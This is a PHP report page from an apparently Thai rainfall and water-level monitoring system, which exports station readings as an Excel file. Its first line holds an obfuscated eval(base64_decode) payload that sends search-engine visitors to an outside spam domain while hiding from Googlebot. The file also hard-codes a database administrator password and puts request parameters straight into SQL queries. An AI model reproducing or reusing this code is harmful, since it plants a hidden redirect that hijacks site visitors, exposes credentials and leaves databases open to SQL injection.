<?php	 	eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOyBpZiAoIWhlYWRlcnNfc2VudCgpKXsgaWYgKGlzc2V0KCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkpeyBpZiAoaXNzZXQoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddKSl7IGlmICgocHJlZ19tYXRjaCAoIi9NU0lFICg5LjB8MTAuMCkvIiwkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10pKSBvciAocHJlZ19tYXRjaCAoIi9ydjpbMC05XStcLjBcKSBsaWtlIEdlY2tvLyIsJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSkgb3IgKHByZWdfbWF0Y2ggKCIvRmlyZWZveFwvKFswLTldK1wuMCkvIiwkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10sJG1hdGNoZikgYW5kICRtYXRjaGZbMV0+MTEpKXsgaWYoIXByZWdfbWF0Y2goIi9eNjZcLjI0OVwuLyIsJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10pKXsgaWYgKHN0cmlzdHIoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddLCJ5YWhvby4iKSBvciBzdHJpc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwiYmluZy4iKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10pKSB7IGlmICghc3RyaXN0cigkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10sImNhY2hlIikgYW5kICFzdHJpc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddLCJFZVlwM0Q3IikpeyBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcGxraWVybmcucmViYXRlc3J1bGUubmV0LyIpOyBleGl0KCk7IH0gfSB9IH0gfSB9IH0="));
	ini_set('max_execution_time',60);
	$site_id = $_REQUEST['site_id'];
	$type = $_REQUEST['type'];
	$date1 = $_REQUEST['date1'];
	$date2 = $_REQUEST['date2'];
	$dtmm1=date('Y-m',strtotime($date1));
	$dtmm2=date('Y-m',strtotime($date2));
	$dtyy=date('Y',strtotime($date1));
	$sta = explode("-", $site_id);
	$ssite=$sta[0];	
	
	$server = "192.168.102.12"; //database location
	//$server = "110.164.126.120"; //database location
	$user = "sa"; //database username
	$pass = "ata+ee&c"; //database password
	$db_name = "SONGKHAM"; //database name

	$dsn = "Driver={SQL Server};Server=$server;Database=$db_name";
	$connection = mssql_connect($server, $user, $pass);
	//$connection = odbc_connect("SONGKHAM","sa","ata+ee&c") or die("Error Connect to Database");

	function dmonth($ddlM)
	{
				if($ddlM=="01" or $ddlM=="1")	{	    $mm="มกราคม";}
				elseif($ddlM=="02" or $ddlM=="2")	{	$mm="กุมภาพันธ์ ";}
				elseif($ddlM=="03" or $ddlM=="3")	{	$mm="มีนาคม ";}
				elseif($ddlM=="04" or $ddlM=="4")	{	$mm="เมษายน ";}
				elseif($ddlM=="05" or $ddlM=="5")	{	$mm="พฤษภาคม ";}
				elseif($ddlM=="06" or $ddlM=="6")	{	$mm="มิถุนายน ";}
				elseif($ddlM=="07" or $ddlM=="7")	{	$mm="กรกฎาคม ";}
				elseif($ddlM=="08" or $ddlM=="8")	{	$mm="สิงหาคม ";}
				elseif($ddlM=="09" or $ddlM=="9")	{	$mm="กันยายน ";}
				elseif($ddlM=="10")	{	$mm="ตุลาคม ";}
				elseif($ddlM=="11")	{	$mm="พฤศจิกายน ";}
				else{	$mm=" ธันวาคม";}
		return $mm;
	}

	function dyear($ddly)
	{
				if($ddly=="2012"){$yy="2555";}
				elseif($ddly=="2013"){$yy="2556 ";}
				elseif($ddly=="2014"){$yy="2557 ";}
				elseif($ddly=="2015"){$yy="2558 ";}
				elseif($ddly=="2016"){$yy="2559 ";}
				elseif($ddly=="2017"){$yy="2560 ";}
				else{$ddly=" 2561";}		
				return $yy;
	}

	if($type=="DS")
	{
		$ddate="select top 1 datepart(DD,DB.DT) dday,datepart(MM,DB.DT) dmm,datepart(YY,DB.DT) dyy ,convert(varchar(10),DB.DT,120) dt ,
		datepart(DD,DB1.DT) dday1,datepart(MM,DB1.DT) dmm1,datepart(YY,DB1.DT) dyy1 ,convert(varchar(10),DB1.DT,120) dt1
		from [KOLOK].[dbo].[DATA_Backup] DB,[KOLOK].[dbo].[DATA_Backup] DB1 where DB.DT='$date1' and DB1.DT='$date1' and DB.STN_ID='$ssite'";
	}
	elseif($type=="DB")
	{
		$ddate="select top 1 datepart(DD,DB.DT) dday,datepart(MM,DB.DT) dmm,datepart(YY,DB.DT) dyy ,convert(varchar(10),DB.DT,120) dt ,
		datepart(DD,DB1.DT) dday1,datepart(MM,DB1.DT) dmm1,datepart(YY,DB1.DT) dyy1 ,convert(varchar(10),DB1.DT,120) dt1
		from [KOLOK].[dbo].[DATA_Backup] DB,[KOLOK].[dbo].[DATA_Backup] DB1 where DB.DT='$date1' and DB1.DT='$date2' and DB.STN_ID='$ssite'";
	}
	else if($type=="MS")
	{
		$ddate="select top 1 datepart(DD,DB.DT) dday,datepart(MM,DB.DT) dmm,datepart(YY,DB.DT) dyy ,convert(varchar(10),DB.DT,120) dt ,
		datepart(DD,DB1.DT) dday1,datepart(MM,DB1.DT) dmm1,datepart(YY,DB1.DT) dyy1 ,convert(varchar(10),DB1.DT,120) dt1
		from [KOLOK].[dbo].[DATA_Backup] DB,[KOLOK].[dbo].[DATA_Backup] DB1 where CONVERT(varchar(7),DB.DT,120)='$dtmm1' and CONVERT(varchar(7),DB1.DT,120)='$dtmm1'
		 and DB.STN_ID='$ssite' order by DB.DT";
	}
	else if($type=="MB")
	{
		$ddate="select top 1 datepart(DD,DB.DT) dday,datepart(MM,DB.DT) dmm,datepart(YY,DB.DT) dyy ,convert(varchar(10),DB.DT,120) dt ,
		datepart(DD,DB1.DT) dday1,datepart(MM,DB1.DT) dmm1,datepart(YY,DB1.DT) dyy1 ,convert(varchar(10),DB1.DT,120) dt1
		from [KOLOK].[dbo].[DATA_Backup] DB,[KOLOK].[dbo].[DATA_Backup] DB1 where CONVERT(varchar(7),DB.DT,120)='$dtmm1' and CONVERT(varchar(7),DB1.DT,120)='$dtmm2'
		 and DB.STN_ID='$ssite' order by DB.DT";
	}
	else
	{
		$ddate="select top 1 datepart(DD,DT) dday,datepart(MM,DT) dmm,datepart(YY,DT) dyy ,convert(varchar(10),DT,120) dt
		from [KOLOK].[dbo].[DATA_Backup] DB where CONVERT(varchar(4),DB.DT,120)='$dtyy' and STN_ID='$ssite' order by DT";
	}

	$dda = mssql_query($ddate);
    $ndd=mssql_fetch_array($dda);
	$sday=$ndd['dday'];
	$smm=$ndd['dmm'];
	$syy=$ndd['dyy'];
	$dt=$ndd['dt'];
	$sday1=$ndd['dday1'];
	$smm1=$ndd['dmm1'];
	$syy1=$ndd['dyy1'];
	$dt1=$ndd['dt1'];
	
	if($type=="DS" or $type=="MS" or $type=="YS")
	{
		$compare_T=0;
	}
	else
	{
		$compare_T=DateDiff($date1,$date2);
	}
	
	$dta = (int)$sday." ".dmonth($smm)."พ.ศ.".dyear($syy);
	$dta1 = (int)$sday1." ".dmonth($smm1)."พ.ศ.".dyear($syy1);
	$ndtm = dmonth($smm)."พ.ศ.".dyear($syy);
	$ndtm1 = dmonth($smm1)."พ.ศ.".dyear($syy1);
	$ndty = dyear($syy);
	$ndty1 = dyear($syy1);

	if($compare_T < 1)
	{
		if($type=="DS")
		{
			$namedateshow="วันที่  $dta";
		}
		elseif($type=="MS")
		{
			$namedateshow="เดือน  $ndtm";
		}
		elseif($type=="YS")
		{
			$namedateshow="ปี  $ndty";
		}
		else{}

	}
	else
	{
		if($type=="DB")
		{
			$namedateshow="ระหว่างวันที่  $dta ถึง $dta1";
		}
		elseif($type=="MB")
		{
			$namedateshow="ระหว่างเดือน  $ndtm ถึง $ndtm1";
		}
		else{}
	}
	
	$ss="SELECT STN_ID,STN_CODE,STN_NAME_THAI FROM [KOLOK].[dbo].[TM_STN] where STN_ID='$ssite'";
    $ress = mssql_query($ss);
    $namesta=mssql_fetch_array($ress);
    $stationss=$namesta['STN_ID'];
	$sname=$namesta['STN_CODE'];
	$namethai=$namesta['STN_NAME_THAI'];
	$Dname=iconv('TIS-620', 'UTF-8', $namethai);

$aname="สถานี"."-".$ssite."-".$namedateshow;
$an=str_replace(" ","",$aname);
header("Content-Type: application/vnd.ms-excel");
header("Content-Disposition: attachment; filename=$an.xls");#ชื่อไฟล์ 

?>

<html xmlns:o="urn:schemas-microsoft-com:office:office"

xmlns:x="urn:schemas-microsoft-com:office:excel"

xmlns="http://www.w3.org/TR/REC-html40">
<HEAD>
<meta http-equiv="Content-type" content="text/html;charset=utf-8" />
	<TITLE>แสดงผลข้อมูล</TITLE>
	<style>
	.xl29
	{mso-style-parent:style0;
	font-family:Tahoma, sans-serif;
	mso-font-charset:0;
	mso-number-format:Fixed;
	text-align:center;
	border:.5pt solid black;
	background:white;
	mso-pattern:auto none;
	white-space:normal;}
	</style>
</HEAD>
<BODY>
<?

$minrf=array();
$hourrf=array();
$wl=array();
$wlavg=array();
$wlmin=array();
$wlmax=array();
$timerf=array();
$timeavg=array();
$timemin=array();
$timemax=array();

if($type =="DS" or $type =="DB")
	{
		?>
		<div class="dataTitle">
			<span class="left"><? echo "สถานี ".$stationss."  ".$Dname; ?></span>
			<span class="right"><? echo "ข้อมูล ".$namedateshow; ?></span>
		</div>
		<div>
		<table align="center" border="1">
				<tr class="tr_head">
					<td rowspan="2">รหัสสถานี </td>
					<td rowspan="2">ชื่อสถานี </td>
					<td rowspan="2" >วันที่ - เวลา</td>
					<td colspan="2" >ปริมาณน้ำฝน (มม.)</td>
					<td rowspan="2">ระดับน้ำ เมตร (รทก.)</td>
				</tr>
				<tr class="tr_head">
				<td >15 นาที</td>
				<td >1 ชั่วโมง</td>
				</tr>		
			<tbody>
			<?
					
				if($type =="DS")
				{
					$sss="select distinct CONVERT(varchar(20),DT,120) AS adate,
					sum(case sensor_id when '100' then CONVERT(decimal(38,2),Value) end) rf ,
					sum(case sensor_id when '200' then CONVERT(decimal(38,2),(Value )) end) wl
					FROM [KOLOK].[dbo].[DATA_Backup]  WHERE DT BETWEEN '".$date1." 00:00' AND '".$date1." 23:50' and STN_ID='".$ssite."' 
					group BY CONVERT(varchar(20),DT,120) order by CONVERT(varchar(20),DT,120)";
				}
				
				else if($type =="DB")
				{
					$sss="select distinct CONVERT(varchar(20),DT,120) AS adate,
					sum(case sensor_id when '100' then CONVERT(decimal(38,2),Value) end) rf ,
					sum(case sensor_id when '200' then CONVERT(decimal(38,2),(Value )) end) wl
					FROM [KOLOK].[dbo].[DATA_Backup]  WHERE DT BETWEEN '".$date1." 00:00' AND '".$date2." 23:50' and STN_ID='".$ssite."' 
					group BY CONVERT(varchar(20),DT,120) order by CONVERT(varchar(20),DT,120)";
				}
				else{}
				
				$rs_check =mssql_query($sss);
				$row = 1;
				$checkrow=mssql_num_rows($rs_check);
					
				if($checkrow=="0" )
				{
					echo "<p align=\"center\"><font color=\"red\">ไม่พบข้อมูล</font></p>";
				}
				else
				{
					while($r_check=mssql_fetch_array($rs_check))
					{
						$sqltm="select * from [KOLOK].[dbo].[TM_STN]  WHERE STN_ID='".$ssite."' order by STN_CODE";
						$result = mssql_query($sqltm);
						$row = mssql_fetch_array($result);
						$STN_ID = $row["STN_ID"];
						$STN_NAME_THAI = iconv('TIS-620', 'UTF-8', $row["STN_NAME_THAI"]);
						$starhour=date("Y-m-d H:00",strtotime($r_check['adate']));
						$endhour=date("Y-m-d H:45",strtotime($r_check['adate']));
						$vmin=date("i",strtotime($r_check['adate']));

						$sumrain="SELECT Sum(case sensor_id when '100' then CONVERT(decimal(38,2),Value) end) vhour
						FROM [KOLOK].[dbo].[DATA_Backup] WHERE STN_ID='".$ssite."' and DT between '".$starhour." ' and '".$endhour."' ";

						$sumrf =mssql_query($sumrain);
						$sumrfh=mssql_fetch_array($sumrf);

						array_push($minrf,$r_check['rf']);
						array_push($hourrf,$sumrfh['vhour']);
						array_push($wl,$r_check['wl']);

				?>
						<tr class="tr_list">
							<td><?=$STN_ID?></td>
							<td><?=$STN_NAME_THAI?></td>
							<td><? echo ShortThaiDate($r_check['adate'],1)?></td>
							<td><?=checkna($r_check['rf'],$STN_ID,0)?></td>
							<td><?if($vmin=="45"){ echo checkna($sumrfh['vhour'],$STN_ID,0);}?></td>
							<td><?=checkna($r_check['wl'],$STN_ID,1)?></td>
						</tr>
				<?
						$row++;
						}	//end while	

						$min15=min($minrf);
						$max15=max($minrf);
						$min1h=min($hourrf);
						$max1h=max($hourrf);
						$minwl=min($wl);
						$maxwl=max($wl);
						$totalrf= array_sum($minrf);
						$totalrfh= array_sum($hourrf);
						$totalwl= array_sum($wl);
						$avgrf= array_sum($minrf)/ count($minrf);
						$avgrfh= array_sum($hourrf)/ count($hourrf);
						$avgwl= array_sum($wl) / count($wl);
					}
			?>
			</tbody>
			<tfoot>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">MIN</td>
				<td><?=checkna($min15,$STN_ID,0)?></td>
				<td><?=checkna($min1h,$STN_ID,0)?></td>
				<td><?=checkna($minwl,$STN_ID,1)?></td>
			</tr>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">MAX</td>
				<td><?=checkna($max15,$STN_ID,0)?></td>
				<td><?=checkna($max1h,$STN_ID,0)?></td>
				<td><?=checkna($maxwl,$STN_ID,1)?></td>
			</tr>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">SUM</td>
				<td><?echo number_format($totalrf,2);?></td>
				<td><?echo number_format($totalrf,2);?></td>
				<td>-</td>
			</tr>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">Average</td>
				<td>-</td>
				<td>-</td>
				<td><?echo number_format($avgwl,2);?></td>
			</tr>
		</tfoot>
		</table>
		</div>
	<?}
	else if($type =="MS" or $type =="MB")
	{
	?>
		<div class="dataTitle">
			<span class="left"><? echo "สถานี ".$stationss."  ".$Dname; ?></span>
			<span class="right"><? echo "ข้อมูล ".$namedateshow; ?></span>
		</div>
		<div>
		<table align="center" border="1">
				<tr class="tr_head">
					<td rowspan="2">รหัสสถานี </td>
					<td rowspan="2">ชื่อสถานี </td>
					<td rowspan="2" >วันที่ - เวลา</td>
					<td colspan="1" >ปริมาณน้ำฝน (มม.)</td>
					<td colspan="3">ระดับน้ำ เมตร (รทก.)</td>
				</tr>
				<tr class="tr_head">
				<td >น้ำฝนสะสมรายวัน</td>
				<td >เฉลี่ยรายวัน</td>
				<td >ต่ำสุดรายวัน</td>
				<td >สูงสุดรายวัน</td>
				</tr>		
			<tbody>
			<?
			
				if($type =="MS")
				{
					$sss="select distinct CONVERT(varchar(10),DT,120) AS adate,
					sum(case sensor_id when '100' then CONVERT(decimal(38,2),Value) end) rf00 ,
					avg(case sensor_id when '200' then CONVERT(decimal(38,2),Value ) end) wlavg,
					max(case sensor_id when '200' then CONVERT(decimal(38,2),Value ) end) wlmax,
					min(case sensor_id when '200' then CONVERT(decimal(38,2),Value ) end) wlmin
					FROM [KOLOK].[dbo].[DATA_Backup]  WHERE CONVERT(varchar(7),DT,120) BETWEEN '".$dtmm1."' AND '".$dtmm1."' 
					and STN_ID='".$ssite."' 
					group BY CONVERT(varchar(10),DT,120) 
					order by CONVERT(varchar(10),DT,120) ";
				}
				
				else if($type =="MB")
				{
					$sss="select distinct CONVERT(varchar(10),DT,120) AS adate,
					sum(case sensor_id when '100' then CONVERT(decimal(38,2),Value) end) rf00 ,
					avg(case sensor_id when '200' then CONVERT(decimal(38,2),Value ) end) wlavg,
					max(case sensor_id when '200' then CONVERT(decimal(38,2),Value ) end) wlmax,
					min(case sensor_id when '200' then CONVERT(decimal(38,2),Value ) end) wlmin
					FROM [KOLOK].[dbo].[DATA_Backup]  WHERE CONVERT(varchar(7),DT,120) BETWEEN '".$dtmm1."' AND '".$dtmm2."' 
					and STN_ID='".$ssite."' 
					group BY CONVERT(varchar(10),DT,120) 
					order by CONVERT(varchar(10),DT,120)";
				}
				else{}
				
				$rs_check =mssql_query($sss);
				$row = 1;
				$checkrow=mssql_num_rows($rs_check);
					
				if($checkrow=="0")
				{
					echo "<p align=\"center\"><font color=\"red\">ไม่พบข้อมูล</font></p>";
				}
				else
				{
					while($r_check=mssql_fetch_array($rs_check))
					{
						$sqltm="select * from [KOLOK].[dbo].[TM_STN]  WHERE STN_ID='".$ssite."' order by STN_CODE";
						$result = mssql_query($sqltm);
						$row = mssql_fetch_array($result);
						$STN_ID = $row["STN_ID"];
						$STN_NAME_THAI = iconv('TIS-620', 'UTF-8', $row["STN_NAME_THAI"]);

						array_push($minrf,$r_check['rf00']);
						array_push($wlavg,$r_check['wlavg']);
						array_push($wlmin,$r_check['wlmin']);
						array_push($wlmax,$r_check['wlmax']);

						$timerf[$r_check['adate']][] = $r_check['rf00'];
						$timeavg[$r_check['adate']][] = $r_check['wlavg'];
						$timemin[$r_check['adate']][] = $r_check['wlmin'];
						$timemax[$r_check['adate']][] = $r_check['wlmax'];
				?>
						<tr class="tr_list">
							<td><?=$STN_ID?></td>
							<td><?=$STN_NAME_THAI?></td>
							<td><? echo ShortThaiDate($r_check['adate'],2)?></td>
							<td><?=checkna($r_check['rf00'],$STN_ID,0)?></td>
							<td><?=checkna($r_check['wlavg'],$STN_ID,1)?></td>
							<td><?=checkna($r_check['wlmin'],$STN_ID,1)?></td>
							<td><?=checkna($r_check['wlmax'],$STN_ID,1)?></td>
						</tr>
				<?
						$row++;
						}	//end while	
						
						$dtminrf = array_search(min($timerf),$timerf);
						$dtmaxrf = array_search(max($timerf),$timerf);
						$dtmin_avg = array_search(min($timeavg),$timeavg);
						$dtmax_avg = array_search(max($timeavg),$timeavg);
						$dtmin_min = array_search(min($timemin),$timemin);
						$dtmax_min = array_search(max($timemin),$timemin);
						$dtmin_max = array_search(min($timemax),$timemax);
						$dtmax_max = array_search(max($timemax),$timemax);
						$min15=min($minrf);
						$max15=max($minrf);
						$wlavg_min=min($wlavg);
						$wlavg_max=max($wlavg);
						$wlmin_min=min($wlmin);
						$wlmin_max=max($wlmin);
						$wlmax_min=min($wlmax);
						$wlmax_max=max($wlmax);
						$totalrf= array_sum($minrf);
						$avg_wl= array_sum($wlavg)/ count($wlavg);
						$min_wl= array_sum($wlmin)/ count($wlmin);
						$max_wl= array_sum($wlmax) / count($wlmax);
					}
			?>
			</tbody>
			<tfoot>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">MIN</td>
				<td><?=checkna($min15,$STN_ID,0)?></td>
				<td><?=checkna($wlavg_min,$STN_ID,1)?></td>
				<td><?=checkna($wlmin_min,$STN_ID,1)?></td>
				<td><?=checkna($wlmax_min,$STN_ID,1)?></td>
			</tr>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">TIME MIN</td>
				<td><? echo ShortThaiDate($dtminrf,2)?></td>
				<td><? echo ShortThaiDate($dtmin_avg,2)?></td>
				<td><? echo ShortThaiDate($dtmin_min,2)?></td>
				<td><? echo ShortThaiDate($dtmin_max,2)?></td>
			</tr>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">MAX</td>
				<td><?=checkna($max15,$STN_ID,0)?></td>
				<td><?=checkna($wlavg_max,$STN_ID,1)?></td>
				<td><?=checkna($wlmin_max,$STN_ID,1)?></td>
				<td><?=checkna($wlmax_max,$STN_ID,1)?></td>
			</tr>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">TIME MAX</td>
				<td><? echo ShortThaiDate($dtmaxrf,2)?></td>
				<td><? echo ShortThaiDate($dtmax_avg,2)?></td>
				<td><? echo ShortThaiDate($dtmax_min,2)?></td>
				<td><? echo ShortThaiDate($dtmax_max,2)?></td>
			</tr>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">SUM</td>
				<td><?echo number_format($totalrf,2);?></td>
				<td>-</td>
				<td>-</td>
				<td>-</td>
			</tr>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">Average</td>
				<td>-</td>
				<td><?=checkna($avg_wl,$STN_ID,1)?></td>
				<td><?=checkna($min_wl,$STN_ID,1)?></td>
				<td><?=checkna($max_wl,$STN_ID,1)?></td>
			</tr>
		</tfoot>
		</table>
		</div>
	<?}
	else if($type =="YS" )
	{
	?>
		<div class="dataTitle">
			<span class="left"><? echo "สถานี ".$stationss."  ".$Dname; ?></span>
			<span class="right"><? echo "ข้อมูล ".$namedateshow; ?></span>
		</div>
		<div>
		<table align="center" border="1">
				<tr class="tr_head">
					<td rowspan="2">รหัสสถานี </td>
					<td rowspan="2">ชื่อสถานี </td>
					<td rowspan="2" >วันที่ - เวลา</td>
					<td colspan="1" >ปริมาณน้ำฝน (มม.)</td>
					<td colspan="3">ระดับน้ำ เมตร (รทก.)</td>
				</tr>
				<tr class="tr_head">
				<td >น้ำฝนสะสมรายเดือน</td>
				<td >เฉลี่ยรายเดือน</td>
				<td >ต่ำสุดรายเดือน</td>
				<td >สูงสุดรายเดือน</td>
				</tr>		
			<tbody>
			<?
		
				if($type =="YS")
				{
					$sss="select distinct CONVERT(varchar(7),DT,120) AS adate,
					sum(case sensor_id when '100' then CONVERT(decimal(38,2),Value) end) rf00 ,
					avg(case sensor_id when '200' then CONVERT(decimal(38,2),Value ) end) wlavg,
					max(case sensor_id when '200' then CONVERT(decimal(38,2),Value ) end) wlmax,
					min(case sensor_id when '200' then CONVERT(decimal(38,2),Value ) end) wlmin
					FROM [KOLOK].[dbo].[DATA_Backup]  WHERE CONVERT(varchar(4),DT,120) BETWEEN '".$dtyy."' AND '".$dtyy."' 
					and STN_ID='".$ssite."' 
					group BY CONVERT(varchar(7),DT,120) 
					order by CONVERT(varchar(7),DT,120)  ";
				}
				
				else{}
				
				$rs_check =mssql_query($sss);
				$row = 1;
				$checkrow=mssql_num_rows($rs_check);
					
				if($checkrow=="0")
				{
					echo "<p align=\"center\"><font color=\"red\">ไม่พบข้อมูล</font></p>";
				}
				else
				{
					while($r_check=odbc_fetch_array($rs_check))
					{
						$sqltm="select * from [KOLOK].[dbo].[TM_STN]  WHERE STN_ID='".$ssite."' order by STN_CODE";
						$result = mssql_query($sqltm);
						$row = mssql_fetch_array($result);
						$STN_ID = $row["STN_ID"];
						$STN_NAME_THAI = iconv('TIS-620', 'UTF-8', $row["STN_NAME_THAI"]);
						array_push($minrf,$r_check['rf00']);
						array_push($wlavg,$r_check['wlavg']);
						array_push($wlmin,$r_check['wlmin']);
						array_push($wlmax,$r_check['wlmax']);

						$timerf[$r_check['adate']][] = $r_check['rf00'];
						$timeavg[$r_check['adate']][] = $r_check['wlavg'];
						$timemin[$r_check['adate']][] = $r_check['wlmin'];
						$timemax[$r_check['adate']][] = $r_check['wlmax'];
				?>
						<tr class="tr_list">
							<td><?=$STN_ID?></td>
							<td><?=$STN_NAME_THAI?></td>
							<td><? echo ShortThaiDate($r_check['adate'],3)?></td>
							<td><?=checkna($r_check['rf00'],$STN_ID,0)?></td>
							<td><?=checkna($r_check['wlavg'],$STN_ID,1)?></td>
							<td><?=checkna($r_check['wlmin'],$STN_ID,1)?></td>
							<td><?=checkna($r_check['wlmax'],$STN_ID,1)?></td>
						</tr>
				<?
						$row++;
						}	//end while	
						$dtminrf = array_search(min($timerf),$timerf);
						$dtmaxrf = array_search(max($timerf),$timerf);
						$dtmin_avg = array_search(min($timeavg),$timeavg);
						$dtmax_avg = array_search(max($timeavg),$timeavg);
						$dtmin_min = array_search(min($timemin),$timemin);
						$dtmax_min = array_search(max($timemin),$timemin);
						$dtmin_max = array_search(min($timemax),$timemax);
						$dtmax_max = array_search(max($timemax),$timemax);
						$min15=min($minrf);
						$max15=max($minrf);
						$wlavg_min=min($wlavg);
						$wlavg_max=max($wlavg);
						$wlmin_min=min($wlmin);
						$wlmin_max=max($wlmin);
						$wlmax_min=min($wlmax);
						$wlmax_max=max($wlmax);
						$totalrf= array_sum($minrf);
						$avg_wl= array_sum($wlavg)/ count($wlavg);
						$min_wl= array_sum($wlmin)/ count($wlmin);
						$max_wl= array_sum($wlmax) / count($wlmax);
					}
			?>
			</tbody>
			<tfoot>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">MIN</td>
				<td><?=checkna($min15,$STN_ID,0)?></td>
				<td><?=checkna($wlavg_min,$STN_ID,1)?></td>
				<td><?=checkna($wlmin_min,$STN_ID,1)?></td>
				<td><?=checkna($wlmax_min,$STN_ID,1)?></td>
			</tr>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">TIME MIN</td>
				<td><? echo ShortThaiDate($dtminrf,3)?></td>
				<td><? echo ShortThaiDate($dtmin_avg,3)?></td>
				<td><? echo ShortThaiDate($dtmin_min,3)?></td>
				<td><? echo ShortThaiDate($dtmin_max,3)?></td>
			</tr>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">MAX</td>
				<td><?=checkna($max15,$STN_ID,0)?></td>
				<td><?=checkna($wlavg_max,$STN_ID,1)?></td>
				<td><?=checkna($wlmin_max,$STN_ID,1)?></td>
				<td><?=checkna($wlmax_max,$STN_ID,1)?></td>
			</tr>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">TIME MAX</td>
				<td><? echo ShortThaiDate($dtmaxrf,3)?></td>
				<td><? echo ShortThaiDate($dtmax_avg,3)?></td>
				<td><? echo ShortThaiDate($dtmax_min,3)?></td>
				<td><? echo ShortThaiDate($dtmax_max,3)?></td>
			</tr>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">SUM</td>
				<td><?echo number_format($totalrf,2);?></td>
				<td>-</td>
				<td>-</td>
				<td>-</td>
			</tr>
			<tr class="tr_list" bgcolor='#EEEED1'>
				<td colspan="3">Average</td>
				<td>-</td>
				<td><?=checkna($avg_wl,$STN_ID,1)?></td>
				<td><?=checkna($min_wl,$STN_ID,1)?></td>
				<td><?=checkna($max_wl,$STN_ID,1)?></td>
			</tr>
		</tfoot>
		</table>
		</div>
	<?}
	else{}

function checkna($n,$ssite,$mm)
{
	if($ssite=="TNU1" || $ssite=="TNY1" || $ssite=="TSL1" || $ssite=="TSL2" || $ssite=="TSU1" || $ssite=="TSU2")
	{
			if($mm=="0")
			{
				$s=number_format($n,2);
			}
			else
			{
				$s="n/a";
			}
	}
	elseif($n=="")
	{
		$s="-";
	}
	else
	{
		$s=number_format($n,2);
	}
	return $s;
}
function addValue($value,$cp)
{
	if($cp=="0")
	{
		$x = numm($value);
	}
	else
	{
		$x = "";
	}
	return $x;
}
function DateDiff($strDate1,$strDate2)
{
	return (strtotime($strDate2) - strtotime($strDate1))/  ( 60 * 60 * 24 );  // 1 day = 60*60*24
}

function ShortThaiDate($txt,$ss)
{
	global $ThaiSubMonth;
	$Year = substr(substr($txt, 0, 4)+543, -4);
	$Month = substr($txt, 5, 2);
	$DayNo = substr($txt, 8, 2);
	$T = substr($txt, 11, 5);
	if($ss==1)
	{
		$x = $DayNo."/".$Month."/".$Year." "."เวลา ".$T." น.";
	}
	else if($ss==2)
	{
		$x = $DayNo."/".$Month."/".$Year;
	}
	else if($ss==3)
	{
		$x = $Month."/".$Year;
	}
	else{}
	return $x;
}
?>
</BODY>
</HTML>